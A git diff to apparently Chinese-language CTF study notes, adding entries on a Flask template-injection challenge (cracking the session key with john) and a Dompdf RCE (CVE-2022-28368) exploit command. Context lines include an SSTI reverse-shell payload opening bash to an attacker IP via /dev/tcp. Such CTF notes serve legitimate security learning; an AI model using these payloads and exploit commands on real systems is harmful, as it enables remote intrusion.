@@ -1848,10 +1848,11 @@ cast send 0x[Selfdestruct] "kill(address)" 0x[target address] --rpc-url $RPC_URL
     }
 ```
 那么assert永远不会通过。
+
 211. [Drink from my Flask #1](https://github.com/HeroCTF/HeroCTF_v5/tree/main/Web/Drink_from_my_Flask_1)
 - python flask ssti+key爆破、session伪造
     - 反弹shell payload：`{{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/172.17.0.1/9999 0>&1\"').read() }}`,172.17.0.1换为攻击机器外网ip
-    - john爆破session key：`john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256`
+    - john爆破session key：`john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256`。format可以根据题目要求更改，如HMAC-MD5。使用[脚本](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py)将jwt转换为john爆破的目标。
     - 此题的一些unintended solutions：
 ```
 /{{config.update(u=config.update)}}
@@ -2447,3 +2448,6 @@ gambling_contract = web3.eth.contract(address='', abi=gambling_abi)
 #如何从RPC provider那里获取mempool内容
 #cast命令调用合约函数
 ```
+245. [Stickers](https://github.com/daffainfo/ctf-writeup/tree/main/NahamCon%20CTF%202023/Stickers)
+- CVE-2022-28368 - Dompdf RCE利用。使用工具： https://github.com/rvizx/CVE-2022-28368/tree/main。`python3 dompdf-rce.py --inject "将html转为pdf的url" --dompdf "http://vuln/dompdf/"`。该payload可以反弹shell。
+	- `Unable to stream pdf:headers already sent`为dompdf的错误提示
